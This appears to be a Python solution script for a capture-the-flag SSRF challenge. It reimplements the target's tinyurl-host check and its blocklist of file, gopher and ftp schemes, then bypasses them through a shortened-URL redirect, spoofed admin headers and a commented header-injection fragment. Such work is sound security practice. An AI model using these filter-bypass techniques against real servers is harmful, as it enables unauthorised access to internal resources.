import requests

from urllib import request
from urllib.parse import urlparse


url = 'https://tinyurl.com/hackin7ctfsghack'


actualURL = "https://tinyurl.com/hackin7ctfsghack"
actualIp = actualURL
_HDRS = ''.join((
    ' HTTP/1.1\r\n',
    'X-Forwarded-For: %s\r\n',
    'Accept-Encoding: identity\r\n',
    f'Host: {actualURL}\r\n',
    'Connection: close\r\n',
    'User-Agent: AdminBrowser/1.337\r\n',
    '\r\n',
    '\r\n',
    'grbg',
)) % (actualIp, )

payload = url #+ '?data="1"' + _HDRS # Inserted fragment to get past check

### Checks
def servercode(url_proxy):
    b = urlparse(url_proxy)
    if b.netloc != "tinyurl.com":
        print("!!!!!!!!!!!!!!URL is not from tinyurl.com!!!!!!!!!!!!!!")
    print("URL from tinyurl.com check")

    proxy_data = request.urlopen(url_proxy)
    print("Opened URL")

    print(proxy_data.read())
    safe_url = proxy_data.read().decode('utf-8')
    safe_url_parsed = urlparse(safe_url)
    if safe_url_parsed.scheme in ["file","gopher","ftp","smtp","tftp","mailto"]:
        return "Illegal Scheme Detected!"
    response = request.urlopen(safe_url)
    return response.read().decode('utf-8')

#print(servercode("https://raw.githubusercontent.com/Hackin7/Programming-Crappy-Solutions/master/test"))

def checks(url_proxy):
    b = urlparse(url_proxy)
    if b.netloc != "tinyurl.com":
        print("!!!!!!!!!!!!!!URL is not from tinyurl.com!!!!!!!!!!!!!!")
    print("URL from tinyurl.com check")
    
    proxy_data = request.urlopen(url_proxy)
    print("Opened URL")
    
    safe_url = proxy_data.read().decode('utf-8')
    safe_url_parsed = urlparse(safe_url)
    if safe_url_parsed.scheme in ["file","gopher","ftp","smtp","tftp","mailto"]:
        print( "Illegal Scheme Detected!")
    else:
        print("No Illegal Scheme")

print("#"*30)
print("Payload:\n"+ payload)
print("#"*30)
print("Checking")
#checks(payload)
data = requests.get('http://chals.ctf.sg:30201/search',
                    params = {'url': payload}
                    )

print(data.text)
